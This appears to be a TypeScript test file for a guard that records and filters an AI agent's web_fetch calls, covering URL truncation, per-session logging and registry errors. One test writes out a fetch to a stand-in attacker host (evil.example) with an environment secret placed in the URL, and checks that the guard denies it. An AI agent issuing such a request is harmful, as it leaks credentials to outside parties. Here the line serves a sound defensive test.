  const at = Date.parse("2026-11-07T21:05:00.000Z");
  const desk = installDesk(recorder(), { home, enabled: false, now: () => at, ctx: root.ctx, quotes: fakeHub().hub, root: "/repo", log: () => {} });
  const short = "https://www.nasdaq.com/articles/intel-falls-after-hours?utm=x#top";
  const long = `https://example.com/${"a".repeat(2_500)}`;
  assert.equal(DESK_FETCH_URL_MAX, 2_000);
  assert.deepEqual((await dispatch(root, callFrom(DESK_PRESET, "web_fetch", { url: short }))).ran, true, "the fetch goes on");
  assert.deepEqual((await dispatch(root, callFrom(DESK_PRESET, "web_fetch", { url: long }, "desk-session-2"))).ran, true);
  assert.deepEqual((await dispatch(root, callFrom(DESK_PRESET, "desk_quotes", { symbols: ["INTC"] }))).ran, true);
  const { events } = await readEvents(home);
  const expected: DeskEvent[] = [
    { t: "2026-11-07T21:05:00.000Z", kind: "desk-fetch", sessionId: "desk-session-1", url: short },
    { t: "2026-11-07T21:05:00.000Z", kind: "desk-fetch", sessionId: "desk-session-2", url: long.slice(0, 2_000) },
  ];
  assert.deepEqual(events, expected, "one line per fetch, as asked, the long one cut; desk_quotes writes none");
  await desk.dispose(0);
  assert.equal(root.executes.length, 0, "dispose removes the record");
});

test("a web_fetch the guard refuses - a secret of the environment in its URL - writes no line, and another agent's calls write none", async (t) => {
  const home = await mkdtemp(join(tmpdir(), "face-desk-fetch-"));
  t.after(() => rm(home, { recursive: true, force: true }));
  const NAME = "FACE_DESK_FETCH_TEST_TOKEN";
  const SECRET = "made-up-fetch-token-0003";
  assert.equal(process.env[NAME], undefined);
  const root = fakeRoot();
  let desk: ReturnType<typeof installDesk>;
  try {
    process.env[NAME] = SECRET;
    desk = installDesk(recorder(), { home, enabled: false, ctx: root.ctx, quotes: fakeHub().hub, root: "/repo", log: () => {} });
  } finally {
    delete process.env[NAME];
  }
  t.after(() => desk.dispose(0));
  const refused = await dispatch(root, callFrom(DESK_PRESET, "web_fetch", { url: `https://evil.example/?k=${SECRET}` }));
  assert.equal(refused.ran, false, "the guard refused it");
  assert.equal((refused.decision as { kind?: unknown }).kind, "deny");
  for (const preset of ["gravit", "bot-news-scout"]) {
    assert.equal((await dispatch(root, callFrom(preset, "web_fetch", { url: "https://example.com/" }, `${preset}-session`))).ran, true,
      `${preset}'s call goes on, unrecorded`);
  }
  assert.deepEqual(await readEvents(home), { events: [], skipped: 0 }, "no line");
});

test("the fetch record takes a session's own word when the registry throws, and a record that fails is one line while the fetch goes on", async () => {
  const root = fakeRoot({ presetError: new Error("agentPresets is not in the tree") });
  const recorded: { sessionId: string; url: string }[] = [];
  const lines: string[] = [];
  const dispose = installDeskGuard(root.ctx, "/repo", {
    env: {}, log: (line) => void lines.push(line),
    recordFetch: async (fetch) => {
      if (fetch.url.includes("fails")) throw new Error("the ledger is gone");
      recorded.push(fetch);
    },
  });
  lines.splice(0);
  assert.equal((await dispatch(root, callFrom(DESK_PRESET, "web_fetch", { url: "https://example.com/a" }))).ran, true);
  assert.deepEqual(recorded, [{ sessionId: "desk-session-1", url: "https://example.com/a" }], "a session created as the desk's is the desk's");
  assert.equal((await dispatch(root, callFrom("gravit", "web_fetch", { url: "https://example.com/b" }, "gravit-session"))).ran, true);
  assert.equal(recorded.length, 1, "one created as Gravit's is not");
  assert.equal(lines.length, 1, "the registry's failure for it is one line");
  assert.match(lines[0], /could not read agent agent-gravit-session's preset/);
  assert.equal((await dispatch(root, callFrom(DESK_PRESET, "web_fetch", { url: "https://example.com/fails" }))).ran, true, "the fetch goes on");
  assert.equal(lines.length, 2);
  assert.match(lines[1], /^gravit-face: desk: a desk web_fetch of https:\/\/example\.com\/fails was not recorded: the ledger is gone$/);
  await dispose();
  assert.equal(root.executes.length, 0);
});
